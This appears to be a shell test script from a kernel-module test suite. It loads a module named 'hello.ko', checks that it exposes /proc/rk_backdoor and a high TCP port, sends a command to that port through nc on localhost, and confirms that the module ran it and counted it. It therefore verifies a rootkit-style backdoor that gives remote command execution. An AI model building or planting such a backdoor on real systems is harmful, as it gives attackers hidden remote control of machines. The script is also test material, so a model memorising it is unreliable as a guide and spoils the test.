#!/bin/sh
. /lib/check.sh

begin "48-tcp-backdoor"

ifconfig lo 127.0.0.1 up 2>/dev/null

load hello.ko
assert_loaded hello
assert_exists /proc/rk_backdoor

# Extract backdoor port
port=$(cat /proc/rk_backdoor | sed -n 's/^port=\([0-9]*\)$/\1/p')
if [ "$port" -gt 1024 ] 2>/dev/null; then
    _ok "backdoor on port $port"
else
    _fail "expected high port, got '$port'"
fi

# Commands should start at 0
assert_contains /proc/rk_backdoor "commands=0"

# Execute a command whose result cannot be baked into the module.
token="command_$$_$(date +%s)"
result=$(printf 'printf %s\nexit\n' "$token" | nc -w 2 127.0.0.1 "$port" 2>/dev/null)
payload=$(printf '%s' "$result" | sed 's/hello-backdoor> //g')
if [ "$payload" = "$token" ]; then
    _ok "remote command returned its exact dynamic result"
else
    _fail "expected '$token' between protocol prompts, got '$result'"
fi

# Command counter should have incremented
cmds=$(cat /proc/rk_backdoor | sed -n 's/^commands=//p')
if [ "$cmds" -gt 0 ] 2>/dev/null; then
    _ok "command counter = $cmds"
else
    _fail "command counter not incremented ($cmds)"
fi

unload hello
assert_absent /proc/rk_backdoor

summary
